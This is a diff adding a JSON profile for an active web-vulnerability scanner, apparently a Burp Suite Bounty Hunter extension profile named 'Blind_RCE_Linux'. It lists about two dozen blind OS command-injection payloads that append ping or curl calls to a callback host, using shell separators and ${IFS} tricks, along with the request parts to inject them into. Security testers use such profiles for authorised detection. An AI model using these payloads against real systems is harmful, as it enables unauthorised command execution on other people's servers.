@@ -1,0 +1,91 @@
+[
+  {
+    "profile_name": "Blind_RCE_Linux",
+    "enabled": true,
+    "scanner": "active",
+    "author": "@bountysecurity",
+    "steps": [
+      {
+        "request_type": "original",
+        "reuse_cookie": false,
+        "insertion_point": "same",
+        "raw_request": "",
+        "payloads": [
+          "true,|ping -c 2 {BH}",
+          "true,||ping -c 2 {BH}",
+          "true,;ping -c 2 {BH}",
+          "true,\u0026\u0026ping -c 2 {BH}",
+          "true,\u0026ping -c 2 {BH}",
+          "true,%0aping -c 2 {BH}",
+          "true,`ping -c 2 {BH}`",
+          "true,$(ping -c 2 {BH})",
+          "true,\u0026ping${IFS}-c2${IFS}{BH}",
+          "true,;ping${IFS}-c2${IFS}{BH}",
+          "true,|ping${IFS}-c2${IFS}{BH}",
+          "true,||ping${IFS}-c2${IFS}{BH}",
+          "true,\u0026\u0026ping${IFS}-c2${IFS}{BH}",
+          "true,%0aping${IFS}-c2${IFS}{BH}",
+          "true,`ping${IFS}-c2${IFS}{BH}`",
+          "true,$(ping${IFS}-c2${IFS}{BH})",
+          "true,\u0026curl${IFS}{BH}",
+          "true,;curl${IFS}{BH}",
+          "true,|curl${IFS}{BH}",
+          "true,||curl${IFS}{BH}",
+          "true,\u0026\u0026curl${IFS}{BH}",
+          "true,%0acurl${IFS}{BH}",
+          "true,`curl${IFS}{BH}`",
+          "true,$(curl${IFS}{BH})"
+        ],
+        "payloads_file": "",
+        "payload_position": "append",
+        "change_http_request": false,
+        "change_http_request_type": "post_to_get",
+        "insertion_points": [
+          "extension_provice",
+          "user_agent",
+          "entire_body",
+          "param_body",
+          "param_cookie",
+          "param_json",
+          "url_path_folder",
+          "param_multipart_attr",
+          "user_provided",
+          "param_url",
+          "param_xml",
+          "param_xml_attr",
+          "url_path_filename",
+          "referer",
+          "origin",
+          "entire_body_xml",
+          "entire_body_json",
+          "entire_body_multipart"
+        ],
+        "header_value": false,
+        "new_headers": [],
+        "match_replace": [],
+        "encoder": [],
+        "url_encode": true,
+        "chars_to_url_encode": "\u0026",
+        "greps_file": "",
+        "grep": [
+          "true,,Blind Host,,"
+        ],
+        "redir_type": "always",
+        "max_redir": 5,
+        "show_alert": "always",
+        "issue_name": "Blind_RCE_Linux",
+        "issue_severity": "High",
+        "issue_confidence": "Certain",
+        "issue_detail": "\u003cbr/\u003e\u003cbr/\u003e- PAYLOAD: \u003cbr/\u003e\u003cpayload\u003e\n\u003cbr/\u003e\u003cbr/\u003e\n- GREP: \u003cbr/\u003e\u003cgrep\u003e",
+        "remediation_detail": "",
+        "issue_background": "",
+        "remediation_background": ""
+      }
+    ],
+    "Tags": [
+      "All",
+      "RCE",
+      "Fase 2"
+    ]
+  }
+]
